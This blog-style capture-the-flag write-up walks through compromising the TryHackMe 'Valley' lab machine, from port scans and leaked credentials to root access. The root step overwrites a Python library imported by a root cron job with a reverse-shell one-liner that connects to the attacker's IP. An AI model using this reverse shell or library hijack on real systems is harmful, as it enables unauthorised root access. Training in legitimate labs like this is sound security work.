---
title: valley-thm
date: 2024-04-01 01:03:25 -0500
description: maximum 155 char description
categories: [Hacking for Beginners]
tags: [HTB, CTFs, Hacking]
image:
    path:
---


- **[The Best Academy to Learn Hacking](https://affiliate.hackthebox.com/nenandjabhata)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


## Reconnaissance

```sh
# rustscan  --range 1-65535 -a 10.10.133.211 --ulimit 5000 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.133.211:22
Open 10.10.133.211:80
Host is up, received timestamp-reply ttl 61 (0.62s latency).
Scanned at 2024-04-01 01:04:41 CDT for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```sh
# ffuf -u http://10.10.133.211/static/FUZZ -w /usr/share/wordlists/dirb/common.txt

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.133.211/static/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 567, Words: 43, Lines: 15, Duration: 634ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 624ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 622ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 669ms]
00                      [Status: 200, Size: 127, Words: 15, Lines: 6, Duration: 680ms]
4                       [Status: 200, Size: 7389635, Words: 0, Lines: 0, Duration: 0ms]
8                       [Status: 200, Size: 7919631, Words: 0, Lines: 0, Duration: 0ms]
1                       [Status: 200, Size: 2473315, Words: 1, Lines: 1, Duration: 615ms]
10                      [Status: 200, Size: 2275927, Words: 1, Lines: 1, Duration: 616ms]
11                      [Status: 200, Size: 627909, Words: 1, Lines: 1, Duration: 613ms]
12                      [Status: 200, Size: 2203486, Words: 1, Lines: 1, Duration: 611ms]
13                      [Status: 200, Size: 3673497, Words: 1, Lines: 1, Duration: 611ms]
14                      [Status: 200, Size: 3838999, Words: 1, Lines: 1, Duration: 602ms]
15                      [Status: 200, Size: 3477315, Words: 1, Lines: 1, Duration: 602ms]
2                       [Status: 200, Size: 3627113, Words: 1, Lines: 1, Duration: 607ms]
3                       [Status: 200, Size: 421858, Words: 1, Lines: 1, Duration: 1056ms]
5                       [Status: 200, Size: 1426557, Words: 1, Lines: 1, Duration: 1017ms]
6                       [Status: 200, Size: 2115495, Words: 1, Lines: 1, Duration: 1010ms]
7                       [Status: 200, Size: 5217844, Words: 1, Lines: 1, Duration: 1006ms]
9                       [Status: 200, Size: 1190575, Words: 1, Lines: 1, Duration: 1024ms]
:: Progress: [4622/4622] :: Job [1/1] :: 67 req/sec :: Duration: [0:01:25] :: Errors: 0 ::
```

```sh
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```


![Valley Login]()

`dev.js`

```js
function showErrorMessage(element, message) {
  const error = element.parentElement.querySelector('.error');
  error.textContent = message;
  error.style.display = 'block';
}

loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
}
```

```plaintext
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```


```sh
└─# nmap -sV -Pn -p- --min-rate 5000 10.10.133.211
Nmap scan report for 10.10.133.211
Host is up (0.62s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
37370/tcp open  ftp     vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```


Now logged using same user and password on the ftp

```sh
Connected to 10.10.133.211.
220 (vsFTPd 3.0.3)
Name (10.10.133.211:blo): siemDev
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||41455|)
150 Here comes the directory listing.
dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 .
dr-xr-xr-x    2 1001     1001         4096 Mar 06  2023 ..
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.
ftp> 
```

found this line `uname=valleyDev&psw=ph0t0s1234&remember=on` on `siemHTTP2`

```sh
─# ssh valleyDev@10.10.133.211
valleyDev@10.10.133.211's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$ cat user.txt 
THM{k@l1_1n_th3_v@lley}
valleyDev@valley:~$ 

```


## Privilege Escalation


```sh
valleyDev@valley:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py

#
valleyDev@valley:~$
```


```py
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)

```


```sh
valleyDev@valley:/home$ find / -type f -name 'base64.py' -ls 2>/dev/null
   263097     20 -rwxrwxr-x   1 root     valleyAdmin    20382 Mar 13  2023 /usr/lib/python3.8/base64.py
     3929     20 -rwxr-xr-x   1 root     root           20382 Nov 14  2022 /snap/core20/1828/usr/lib/python3.8/base64.py
     3906     20 -rwxr-xr-x   1 root     root           20382 Jun 22  2022 /snap/core20/1611/usr/lib/python3.8/base64.py
valleyDev@valley:/home$ 

```

```sh
valleyDev@valley:/home$ ls -la *
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator

ls: cannot open directory 'siemDev': Permission denied
ls: cannot open directory 'valley': Permission denied
valleyDev:
total 24
drwxr-xr-x 5 valleyDev valleyDev 4096 Mar 13  2023 .
drwxr-xr-x 5 root      root      4096 Mar  6  2023 ..
-rw-r--r-- 1 root      root         0 Mar 13  2023 .bash_history
drwx------ 3 valleyDev valleyDev 4096 Mar 20  2023 .cache
drwx------ 4 valleyDev valleyDev 4096 Mar  6  2023 .config
drwxr-xr-x 3 valleyDev valleyDev 4096 Mar  6  2023 .local
-rw-rw-rw- 1 root      root        24 Mar 13  2023 user.txt
valleyDev@valley:/home$ file valleyAuthenticator 
valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
valleyDev@valley:/home$ 
```

```sh
# wget http://10.10.133.211:1337/valleyAuthenticator
--2024-04-01 01:54:31--  http://10.10.133.211:1337/valleyAuthenticator
Connecting to 10.10.133.211:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 749128 (732K) [application/octet-stream]
Saving to: ‘valleyAuthenticator’

valleyAuthenticator     100%[============================>] 731.57K   230KB/s    in 3.2s    

2024-04-01 01:54:35 (230 KB/s) - ‘valleyAuthenticator’ saved [749128/749128]

                                                                                             
┌──(root㉿xXxX)-[/tmp]
└─# file valleyAuthenticator 
valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header

```


```sh
─# strings valleyAuthenticator | grep -C 10 "username"
USHc
[]A\A]A^
t*f.
[]A\
I9\$xv.I
T$pH
tKU1
e6722920bab2326f8217e4bf6b1b58ac
dd2921cc76ee3abfd2beb60709056cfb
Welcome to Valley Inc. Authenticator
What is your username: 
What is your password: 
Authenticated
Wrong Password or Username
basic_string::_M_construct null not valid
%02x
basic_string::_M_construct null not valid
terminate called recursively
  what():  
terminate called after throwing an instance of '
terminate called without an active exception
```

`e6722920bab2326f8217e4bf6b1b58ac:liberty123` pass
`dd2921cc76ee3abfd2beb60709056cfb:valley` user

```sh
valleyDev@valley:/home$ ./valleyAuthenticator 
Welcome to Valley Inc. Authenticator
What is your username: valley
What is your password: liberty123
Authenticated
valleyDev@valley:/home$ 
valleyDev@valley:/home$ su valley
Password: 
valley@valley:/home$ 
```


```sh
valley@valley:/home$ find / -type f -name 'base64.py' -ls 2>/dev/null
   263097     20 -rwxrwxr-x   1 root     valleyAdmin    20382 Mar 13  2023 /usr/lib/python3.8/base64.py
     3929     20 -rwxr-xr-x   1 root     root           20382 Nov 14  2022 /snap/core20/1828/usr/lib/python3.8/base64.py
     3906     20 -rwxr-xr-x   1 root     root           20382 Jun 22  2022 /snap/core20/1611/usr/lib/python3.8/base64.py
valley@valley:/home$ groups
valley valleyAdmin
```

```sh
valley@valley:/home$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.65.5",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > /usr/lib/python3.8/base64.py
└─# sudo rlwrap nc -lnvp 1337                            
listening on [any] 1337 ...
connect to [10.4.65.5] from (UNKNOWN) [10.10.133.211] 60726
root@valley:~# 
root@valley:~# hostnamectl
hostnamectl
   Static hostname: valley
         Icon name: computer-vm
           Chassis: vm
        Machine ID: dea3c4b1d9464a05a237bbb294d0553c
           Boot ID: acbea739e3f54de8ad05664f0991a72f
    Virtualization: kvm
  Operating System: Ubuntu 20.04.6 LTS
            Kernel: Linux 5.4.0-139-generic
      Architecture: x86-64
cat root.txt 
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
```






## Ressources supplementaires
Voici quelques ressources supplémentaires qui pourraient vous être utiles :
[]()
[]()
- [Join Us on Discord](https://discord.gg/wBT9wr9ruG).
